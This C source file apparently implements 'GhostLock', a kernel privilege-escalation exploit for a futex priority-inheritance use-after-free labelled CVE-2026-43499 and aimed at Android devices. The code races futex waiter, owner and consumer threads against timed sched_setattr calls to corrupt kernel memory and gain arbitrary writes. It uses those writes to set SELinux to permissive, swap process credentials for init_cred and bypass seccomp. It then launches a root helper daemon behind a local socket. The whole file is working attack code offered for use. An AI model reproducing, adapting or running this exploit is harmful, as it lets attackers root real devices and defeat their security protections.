/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * W1: SELinux permissive -> W2: cred = init_cred -> W3: seccomp bypass ->
 * ksud late-load.
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <poll.h>

extern char **environ;

const struct kernel_offsets *active_offsets = NULL;

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef ROOT_TASK_GROUP_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
#ifdef TARGET_KERNEL_RELEASE
  if (strcmp(uts.release, TARGET_KERNEL_RELEASE) != 0) {
    pr_error("build requires kernel %s, got %s\n",
             TARGET_KERNEL_RELEASE, uts.release);
    return -1;
  }
#endif
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      /* Publish the selected entry's init_cred image address. */
      g_init_cred_image = INIT_CRED;
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int owner_stop;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_inflight;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
_Atomic uint64_t gk_enter_ts;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
    futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  pr_info("waiter requeue_pi ret=%ld errno=%d\n", wait_ret, errno);
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  while (!atomic_load(&owner_stop)) sleep(1);
  if (lock_target == 0)
    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  return NULL;
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int sync_route_enabled = active_offsets && active_offsets->sync_route;
  int max_calls = (active_offsets && active_offsets->consumer_max_calls)
                    ? active_offsets->consumer_max_calls
                    : CONSUMER_MAX_CALLS;
  int call_interval_usec = active_offsets
    ? active_offsets->consumer_call_interval_usec : 0;
  if (active_offsets && active_offsets->consumer_core) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(active_offsets->consumer_core, &cpuset);
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
      pin_to_core(CONSUMER_CORE);
    }
  } else {
    pin_to_core(CONSUMER_CORE);
  }
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    if (sync_route_enabled) {
      /* Use one precisely-timed fire: anchor at the pselect entry
       * timestamp, sleep to ~1ms before the mark, busy-wait the last
       * ~2ms.  Repeated firing on the corrupted rb tree risks a
       * hardlockup, so exactly one punch per route. */
      int delay_usec = atomic_load(&main_route_delay_usec);
      uint64_t enter = 0;
      while (!(enter = atomic_load(&gk_enter_ts))) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        __asm__ volatile("yield" ::: "memory");
      }
      if (!enter) continue;
      uint64_t target = enter + (uint64_t)delay_usec * 1000ULL;
      for (;;) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        uint64_t now = mono_ns();
        if (now >= target) break;
        uint64_t rem = target - now;
        if (rem < 1999489ULL) {
          __asm__ volatile("yield" ::: "memory");
          continue;
        }
        usleep((useconds_t)((rem - 1000000ULL) / 1000ULL));
      }
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) continue;
      atomic_fetch_add(&consumer_calls, 1);
      errno = 0;
      long sched_ret =
        sched_setattr_tid(tid, (atomic_load(&consumer_calls) % 19) + 1);
      if (sched_ret == 0) {
        atomic_fetch_add(&consumer_success, 1);
      } else {
        pr_info("sync punch sched_setattr failed errno=%d\n", errno);
      }
      atomic_store(&punch_consume_go, 0);
      continue;
    }
    int calls_this_seq = 0;
    int delay_usec = atomic_load(&main_route_delay_usec);
    if (delay_usec > 0) usleep((useconds_t)delay_usec);
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        atomic_store(&consumer_inflight, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        int sched_errno = errno;
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          errno = 0;
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          int futex_errno = errno;
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          } else if (calls_this_seq == 0) {
            pr_info("consumer sched_setattr failed errno=%d; "
                    "futex fallback failed errno=%d\n",
                    sched_errno, futex_errno);
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        atomic_store(&consumer_inflight, 0);
        calls_this_seq++;
        if (calls_this_seq >= max_calls) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
        if (call_interval_usec) usleep((useconds_t)call_interval_usec);
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&cfi_stage_started, 0);
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&owner_stop, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

int run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  while (!atomic_load(&route_done)) usleep(5000);

  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&owner_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);

  return atomic_load(&consumer_calls) > 0 &&
         atomic_load(&consumer_success) > 0 && cfi_last_step == 0;
}

/* ------------------------------------------------------------------ */
/* EDEADLK-synchronized route (Samsung 6.1): three-thread handshake with a
 * precisely timed sched_setattr operation.                            */
/* ------------------------------------------------------------------ */

atomic_int gk_pselect_entered, gk_route_done, gk_window_hit, gk_fire_success;
static atomic_int gk_t3_ready, gk_t1_holds_a, gk_t2_positioned;
static atomic_int gk_t1_about_wait, gk_t1_done, gk_t1_timeout;
static atomic_int gk_edeadlk, gk_release, gk_owner_has_lock;
static atomic_int gk_waiter_tid, gk_fire_count;
uintptr_t ghostlock_precomputed_task;
uintptr_t ghostlock_precomputed_cred;
static int perf_task_cand_votes[32];

static void *sync_waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  atomic_store(&gk_waiter_tid, (int)syscall(SYS_gettid));
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("sync waiter lock chain errno=%d\n", errno);
  atomic_store(&gk_t1_holds_a, 1);
  while (!atomic_load(&gk_t2_positioned)) usleep(1000);
  atomic_store(&gk_t1_about_wait, 1);

  /* FUTEX_WAIT_REQUEUE_PI takes an ABSOLUTE CLOCK_MONOTONIC timeout —
   * The route uses now+50ms (including the 950ms normalization).
   * A relative-looking {1,0} is 1s after boot: long expired, the waiter
   * returns instantly and the requeue never sees it. */
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  ts.tv_nsec += 50000000L;
  if (ts.tv_nsec >= 950000000L) {
    ts.tv_sec++;
    ts.tv_nsec -= 950000000L;
  }
  errno = 0;
  long r = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &ts, &f_pi_target, 0);
  int wait_errno = errno;
  pr_info("sync waiter wait_requeue_pi ret=%ld errno=%d\n", r, wait_errno);
  if (r == 0 || wait_errno != ETIMEDOUT) {
    futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    atomic_store(&gk_t1_done, 1);
    return NULL;
  }
  atomic_store(&gk_t1_timeout, 1);
  while (!atomic_load(&gk_edeadlk) && !atomic_load(&gk_release))
    __asm__ volatile("yield" ::: "memory");
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  if (atomic_load(&gk_release)) {
    atomic_store(&gk_t1_done, 1);
    return NULL;
  }
  while (!atomic_load(&gk_owner_has_lock) && !atomic_load(&gk_release))
    __asm__ volatile("yield" ::: "memory");
  if (atomic_load(&gk_release)) {
    atomic_store(&gk_t1_done, 1);
    return NULL;
  }
  pr_info("sync waiter pselect begin owner=%d entered=%d route=%d\n",
          atomic_load(&gk_owner_has_lock),
          atomic_load(&gk_pselect_entered), atomic_load(&gk_route_done));
  sync_pselect_phase();
  pr_info("sync waiter pselect end route=%d hit=%d step=%d errno=%d\n",
          atomic_load(&gk_route_done), atomic_load(&gk_window_hit),
          cfi_last_step, cfi_last_errno);
  atomic_store(&gk_t1_done, 1);
  while (!atomic_load(&gk_release)) usleep(10000);
  return NULL;
}

static void *sync_owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("sync owner lock target errno=%d\n", errno);
  while (!atomic_load(&gk_t1_holds_a)) usleep(1000);
  atomic_store(&gk_t2_positioned, 1);
  errno = 0;
  long chain_ret = futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  pr_info("sync owner chain lock ret=%ld errno=%d\n", chain_ret, errno);
  atomic_store(&gk_owner_has_lock, 1);
  while (!atomic_load(&gk_release)) usleep(1000);
  return NULL; /* the owner remains held until the route is released */
}

static void *sync_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  /* Pin this pselect consumer to CPU2.  CPU1 changes the PI handoff timing
   * enough to make the single sched_setattr operation intermittently reboot
   * the device. */
  int consumer_core = (active_offsets && active_offsets->consumer_core)
                        ? active_offsets->consumer_core : 2;
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(consumer_core, &cpuset);
  if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
    pr_warning("sync consumer sched_setaffinity cpu=%d failed errno=%d\n",
               consumer_core, errno);
  }
  if (getenv("CFI_PRECOMPUTE_CRED")) {
    uintptr_t cred = 0;
    int cred_votes = 0;
    for (int attempt = 0; attempt < 5; attempt++) {
      cred = ghostlock_perf_current_cred();
      cred_votes = perf_task_cand_votes[0];
      if (cred && cred_votes >= 3) break;
    }
    __atomic_store_n(&ghostlock_precomputed_cred, cred, __ATOMIC_RELEASE);
    pr_info("sync consumer precomputed cred=%016zx votes=%d\n",
            cred, cred_votes);
    if (!cred) return NULL;
  } else if (getenv("CFI_PRECOMPUTE_TASK")) {
    uintptr_t task = ghostlock_perf_current_task();
    __atomic_store_n(&ghostlock_precomputed_task, task, __ATOMIC_RELEASE);
    pr_info("sync consumer precomputed task=%016zx\n", task);
    if (!task) return NULL;
  }
  atomic_store(&gk_t3_ready, 1);
  int fire_once = 0;
  for (;;) {
    if (!(atomic_load(&gk_pselect_entered) && !fire_once)) {
      if (atomic_load(&gk_route_done)) return NULL;
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    int delay_usec = atomic_load(&main_route_delay_usec);
    uint64_t enter = 0;
    while (!(enter = atomic_load(&gk_enter_ts))) {
      if (atomic_load(&gk_route_done)) return NULL;
      __asm__ volatile("yield" ::: "memory");
    }
    uint64_t target = enter + (uint64_t)delay_usec * 1000ULL;
    /* Sleep to 1ms before the mark, then busy-wait the last ~2ms. */
    for (;;) {
      if (atomic_load(&gk_route_done)) return NULL;
      uint64_t now = mono_ns();
      if (now >= target) break;
      uint64_t rem = target - now;
      if (rem < 2000001ULL) {
        __asm__ volatile("yield" ::: "memory");
        continue;
      }
      usleep((useconds_t)((rem - 1000000ULL) / 1000ULL));
    }
    int n = atomic_fetch_add(&gk_fire_count, 1);
    int tid = atomic_load(&gk_waiter_tid);
    uint64_t punch_now = mono_ns();
    int64_t punch_delta_ns = (int64_t)(punch_now - target);
    pr_info("sync punch begin n=%d tid=%d now=%llu target=%llu "
            "delta_ns=%lld delay_us=%d\n",
            n, tid, (unsigned long long)punch_now,
            (unsigned long long)target, (long long)punch_delta_ns, delay_usec);
    errno = 0;
    long r = sched_setattr_tid(tid, (n % 19) + 1);
    int punch_errno = errno;
    pr_info("sync punch end n=%d ret=%ld errno=%d fire=%d\n",
            n, r, punch_errno, atomic_load(&gk_fire_success));
    if (r != 0) {
      pr_info("sync punch sched_setattr failed errno=%d\n", punch_errno);
    } else {
      atomic_fetch_add(&gk_fire_success, 1);
      if (getenv("CFI_STAGE_IN_CONSUMER") &&
          !pselect_custom_write_enabled() &&
          !atomic_load(&cfi_stage_done)) {
        int stage_ok = try_cfi_stage();
        pr_info("sync consumer cfi stage=%d step=%d errno=%d\n",
                stage_ok, cfi_last_step, cfi_last_errno);
      }
    }
    atomic_store(&gk_route_done, 1);
    fire_once = 1;
  }
}

static int sync_delay_override(void) {
  const char *text = getenv("FOPS_DELAY_USEC");
  if (text == NULL || text[0] == '\0') {
    return -1;
  }

  char *end = NULL;
  errno = 0;
  long value = strtol(text, &end, 0);
  if (errno != 0 || end == text || *end != '\0' || value < 0 ||
      value > 1000000) {
    pr_warning("sync invalid FOPS_DELAY_USEC=%s; using rotation\n", text);
    return -1;
  }
  return (int)value;
}

static int sync_next_persistent_delay_index(int count) {
  static const char state_path[] =
      "/data/local/tmp/.ghostlock_fops_delay_index";
  int state_fd = open(state_path, O_RDWR | O_CREAT | O_CLOEXEC, 0600);
  if (state_fd < 0) {
    return -1;
  }

  uint8_t stored = 0;
  ssize_t read_len = pread(state_fd, &stored, sizeof(stored), 0);
  int index = (read_len == (ssize_t)sizeof(stored) && stored < count)
                  ? (int)stored
                  : 0;
  uint8_t next = (uint8_t)((index + 1) % count);
  ssize_t write_len = pwrite(state_fd, &next, sizeof(next), 0);
  int write_errno = errno;
  errno = 0;
  int sync_ret = fsync(state_fd);
  int sync_errno = errno;
  close(state_fd);
  if (write_len != (ssize_t)sizeof(next)) {
    pr_warning("sync delay index state write failed ret=%zd errno=%d\n",
               write_len, write_errno);
    return -1;
  }
  if (sync_ret != 0) {
    pr_warning("sync delay index state fsync failed ret=%d errno=%d\n",
               sync_ret, sync_errno);
  }
  return index;
}

int run_sync_route(void) {
  reset_main_route_state();
  atomic_store(&gk_pselect_entered, 0);
  atomic_store(&gk_route_done, 0);
  atomic_store(&gk_window_hit, 0);
  atomic_store(&gk_fire_success, 0);
  atomic_store(&gk_t3_ready, 0);
  atomic_store(&gk_t1_holds_a, 0);
  atomic_store(&gk_t2_positioned, 0);
  atomic_store(&gk_t1_about_wait, 0);
  atomic_store(&gk_t1_done, 0);
  atomic_store(&gk_t1_timeout, 0);
  atomic_store(&gk_edeadlk, 0);
  atomic_store(&gk_release, 0);
  atomic_store(&gk_owner_has_lock, 0);
  atomic_store(&gk_waiter_tid, 0);
  atomic_store(&gk_fire_count, 0);
  atomic_store(&gk_enter_ts, 0);

  /* Allow one delay to be selected externally while retaining the normal
   * per-route rotation when the variable is absent. */
  static const int fops_delays[] = {
    70000, 60000, 80000, 40000, 90000, 50000,
  };
  int delay_count = (int)(sizeof(fops_delays) / sizeof(fops_delays[0]));
  static int sync_route_counter;
  int delay_override = sync_delay_override();
  int delay_index = -1;
  const char *delay_source = "rotation";
  int route_delay = delay_override;
  if (delay_override >= 0) {
    delay_index = sync_route_counter++ % delay_count;
    delay_source = "env";
  } else {
    delay_index = sync_next_persistent_delay_index(delay_count);
    if (delay_index >= 0) {
      delay_source = "persistent";
    } else {
      delay_index = sync_route_counter++ % delay_count;
    }
    route_delay = fops_delays[delay_index];
  }
  atomic_store(&main_route_delay_usec, route_delay);
  pr_info("sync route delay=%dus source=%s index=%d\n", route_delay,
          delay_source, delay_index);

  pthread_t waiter, owner, consumer;
  int consumer_rc = pthread_create(&consumer, NULL, sync_consumer_thread, NULL);
  if (consumer_rc != 0)
    pr_error("sync consumer thread create failed rc=%d\n", consumer_rc);

  /* A precomputed task sample can take much longer than the waiter's 50 ms
   * futex timeout. Finish consumer setup before starting the timed route. */
  while (!atomic_load(&gk_t3_ready)) {
    usleep(1000);
  }

  int waiter_rc = pthread_create(&waiter, NULL, sync_waiter_thread, NULL);
  if (waiter_rc != 0)
    pr_error("sync waiter thread create failed rc=%d\n", waiter_rc);
  int owner_rc = pthread_create(&owner, NULL, sync_owner_thread, NULL);
  if (owner_rc != 0)
    pr_error("sync owner thread create failed rc=%d\n", owner_rc);

  while (!atomic_load(&gk_t1_about_wait) || !atomic_load(&gk_t2_positioned)) {
    usleep(1000);
  }

  int ok = 0;
  long last_r = -2;
  int last_errno = -2;
  for (int i = 1000;;) {
    errno = 0;
    long r = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                      &f_pi_target, 0);
    int requeue_errno = errno;
    if (r != last_r || requeue_errno != last_errno) {
      pr_info("sync requeue i=%d ret=%ld errno=%d\n", 1001 - i, r,
              requeue_errno);
      last_r = r;
      last_errno = requeue_errno;
    }
    if (r > 0) break; /* plain wake = route not established */
    if (r == 0) {     /* nobody queued yet */
      if (i == 1) break;
      usleep(1000);
      i--;
      continue;
    }
    if (requeue_errno != EDEADLK) break;
    /* EDEADLK: the forged PI chain is live — let the waiter proceed. */
    pr_info("sync route EDEADLK handoff waiter_done=%d owner_lock=%d\n",
            atomic_load(&gk_t1_done), atomic_load(&gk_owner_has_lock));
    atomic_store(&gk_edeadlk, 1);
    for (;;) {
      if (atomic_load(&gk_t1_done)) break;
      if (getenv("RB_CRED_ONLY") && getuid() == 0) {
        pr_success("sync RB_CRED_ONLY observed uid=0 before route join\n");
        atomic_store(&gk_release, 1);
        return 1;
      }
      usleep(1000);
    }
    pr_info("sync route waiter done timeout=%d window=%d step=%d errno=%d\n",
            atomic_load(&gk_t1_timeout), atomic_load(&gk_window_hit),
            cfi_last_step, cfi_last_errno);
    ok = atomic_load(&gk_t1_timeout) && atomic_load(&gk_window_hit) &&
         cfi_last_step == 0;
    break;
  }
  pr_info("sync route done ok=%d timeout_path=%d hit=%d step=%d\n",
          ok, atomic_load(&gk_t1_timeout), atomic_load(&gk_window_hit),
          cfi_last_step);
  atomic_store(&gk_release, 1);
  atomic_store(&gk_route_done, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
  return ok;
}

static int do_one_write_value(
    uintptr_t target, uintptr_t value, const char *desc, int mode, int leaf) {
  pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
  /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
   * case 1 then makes __rb_change_child() write parent->rb_right (= target)
   * with the erased node's rb_right value: fake_left is always NULL so case 1
   * always fires, and the erased node is RED so no color fixup runs. */
  pselect_child_node = leaf ? 0 : 1;
  set_pselect_write_mode(target, value, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  int routed = active_offsets->sync_route ? run_sync_route()
                                          : run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  if (!routed) {
    pr_warning("  PI route did not produce a verified write\n");
  }
  return routed;
}

static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
  return do_one_write_value(target, 0, desc, mode, leaf);
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) {
    /* untrusted_app often cannot read enforce while SELinux is enforcing. */
    return 0;
  }
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int enforce_readable(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
  if (efd < 0) return 0;
  close(efd);
  return 1;
}

static int process_has_seccomp(void) {
  /* The app flow runs inside zygote, whose seccomp filter blocks
   * finit_module(2). The adb/shell flow has no filter (Seccomp: 0), and
   * fork() inherits that, so the W2 child does not need W3 there. */
  FILE *status = fopen("/proc/self/status", "r");
  if (!status) return 0;
  char line[256];
  int seccomp = 0;
  while (fgets(line, sizeof(line), status)) {
    if (strncmp(line, "Seccomp:", 8) == 0) {
      seccomp = atoi(line + 8);
      break;
    }
  }
  fclose(status);
  return seccomp != 0;
}

static void slab_drain(void) {
  /* Keep this light in untrusted_app. Aggressive fork storms trip LMK/OOM
   * (exit 137) especially right before heap spray. */
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 2 : 1;
  int batch = (up.tv_sec > 60) ? 64 : 32;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc((size_t)batch, sizeof(pid_t));
    if (!drain) return;
    int n = 0;
    for (int i = 0; i < batch; i++) {
      pid_t pid = fork();
      if (pid == 0) {
        pause();
        _exit(0);
      }
      if (pid > 0) drain[n++] = pid;
      else break;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
    usleep(20000);
  }
}

static char g_home_dir[256] = "/data/local/tmp";
static char g_root_script_path[300] = "/data/local/tmp/.ghostlock_root.sh";

#define DEFAULT_LOCAL_ROOT_HELPER_PATH "/data/local/tmp/ghostlock-helper"
#define LOCAL_ROOT_SOCKET "/data/local/tmp/temp_su.sock"

const char *ghostlock_root_script_path(void) { return g_root_script_path; }

static const char *local_root_helper_path(void) {
  const char *from_app = getenv("GHOSTLOCK_HELPER_PATH");
  if (from_app && from_app[0] && access(from_app, X_OK) == 0) {
    return from_app;
  }
  if (access(DEFAULT_LOCAL_ROOT_HELPER_PATH, X_OK) == 0) {
    return DEFAULT_LOCAL_ROOT_HELPER_PATH;
  }
  if (from_app && from_app[0]) {
    return from_app;
  }
  return DEFAULT_LOCAL_ROOT_HELPER_PATH;
}

static int start_root_daemon(const char *allowed_uid) {
  const char *helper_path = local_root_helper_path();
  unlink(LOCAL_ROOT_SOCKET);
  pid_t helper = fork();
  if (helper == 0) {
    setsid();
    int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
      dup2(null_fd, STDOUT_FILENO);
      dup2(null_fd, STDERR_FILENO);
      if (null_fd > STDERR_FILENO) close(null_fd);
    }
    for (int fd = 3; fd < 1024; fd++) {
      int fl = fcntl(fd, F_GETFD);
      if (fl >= 0) fcntl(fd, F_SETFD, fl | FD_CLOEXEC);
    }
    char *const helper_argv[] = {
        "ghostlock-helper", "--umh", (char *)allowed_uid, NULL
    };
    execve(helper_path, helper_argv, environ);
    _exit(127);
  }
  if (helper < 0) return 0;

  for (int i = 0; i < 50; i++) {
    if (access(LOCAL_ROOT_SOCKET, F_OK) == 0) return 1;
    int status = 0;
    if (waitpid(helper, &status, WNOHANG) == helper) return 0;
    usleep(100000);
  }
  return 0;
}

